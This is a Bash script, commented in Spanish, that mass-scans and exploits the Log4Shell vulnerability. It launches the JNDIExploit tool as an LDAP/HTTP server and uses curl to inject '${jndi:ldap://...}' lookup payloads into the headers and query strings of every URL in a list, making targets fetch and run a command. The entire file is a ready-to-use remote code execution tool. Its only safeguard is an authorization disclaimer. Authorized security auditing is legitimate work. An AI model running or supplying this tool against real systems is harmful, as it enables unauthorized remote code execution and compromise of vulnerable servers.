#! /bin/bash

# *****************************************************************************************************************
# Script en bash que permite identificar y/o explotar la vulnerabilidad Log4shell de forma remota.
# Autor: Julian David Delgado Piraquive - H4ggen
# Siempre utilizar este script con la autorización previa del propietario del servicio o aplicación auditada
# ¡Hack your Mind!
# *****************************************************************************************************************

# Debes ingresar los siguientes parámetros:
#	1. Diccionario de URLs a escanear
#	2. Dirección IP del servidor LDAP
#	3. Puerto servidor LDAP
#	4. Dirección IP servidor HTTP
#	5. Puerto servidor HTTP
#	EJEMPLO /Log4Shell_Scanner.sh <Diccionario_URL> <IP_Servidor_LDAP> <Puerto_Servidor_LDAP> <IP_Servidor_HTTP> <Puerto_Servidor_HTTP>


trap ctrl_c INT #Función salir con Control+C

function ctrl_c(){
    tput cnorm
    echo -e "\n\n[!] Saliendo..."
    kill %
    exit 1
}

EJEMPLO="./Log4Shell_Scanner.sh <Diccionario_URL> <IP_Servidor_LDAP> <Puerto_Servidor_LDAP> <IP_Servidor_HTTP> <Puerto_Servidor_HTTP>"

if [ -z "$1" ];then
	      echo -e '\e[0;31mFALTAN DATOS!\e[0m Por favor indique el diccionario de URLs a escanear.'
	      echo $EJEMPLO

elif [ -z "$2" ];then
        echo -e '\e[0;31mFALTAN DATOS!\e[0m Por favor indique la IP del servidor LDAP.'
        echo $EJEMPLO

elif [ -z "$3" ];then
        echo -e '\e[0;31mFALTAN DATOS!\e[0m Por favor indique el Puerto servidor LDAP.'
        echo $EJEMPLO

elif [ -z "$4" ];then
        echo -e '\e[0;31mFALTAN DATOS!\e[0m Por favor indique la IP del servidor HTTP.'
        echo $EJEMPLO

elif [ -z "$5" ];then
        echo -e '\e[0;31mFALTAN DATOS!\e[0m Por favor indique el Puerto del servidor HTTP.'
        echo $EJEMPLO
                
else
	echo -e '\e[1;34mEl diccionario de URLs seleccionado es:\e[0m' $1 
	echo -e '\e[1;34mEl servidor LDAP seleccionado es:\e[0m' $2':'$3
	echo -e '\e[1;34mEl servidor HTTP seleccionado es:\e[0m' $4':'$5
 	echo -e '\n\e[1;34mIniciando Servidor LDAP y HTTP:\e[0m'


# Para analizar aplicaciones en internet puedes utilizar Ngrok, lo único que debes hacer es quitar el parámetro "-l $3" de la siguiente linea:

	java -jar JNDIExploit-1.2-SNAPSHOT.jar -l $3 -i $4 -p $5 & 1> /dev/null 
	
	sleep 5
	
	echo -e '\n\e[1;34mIniciando Análisis utilizando X-Api-Version, User-Agent, X-Forwarded-For y LDAP Payload:\e[0m'

payloadheader='${jndi:ldap://'$2':'$3'/Basic/Command/Base64/aWZjb25maWc=}'
payload='?foo=$\{jndi:ldap://'$2':'$3'/Basic/Command/Base64/aWZjb25maWc=\}'


while read line;do
	echo -e '\e[1;34mEscaneando\e[0m: '$line

	curl -s --max-time 5 $line -H 'X-Api-Version: '$payloadheader'' > /dev/null 
	
	curl -s --max-time 5 $line -H 'User-Agent: '$payloadheader}'' > /dev/null 
	
	curl -s --max-time 5 $line -H 'X-Forwarded-For: '$payloadheader}'' > /dev/null 
	
	curl -s --max-time 5 "$line$payload" > /dev/null 
	
	sleep 1
	
done < $1 
fi
kill %
exit
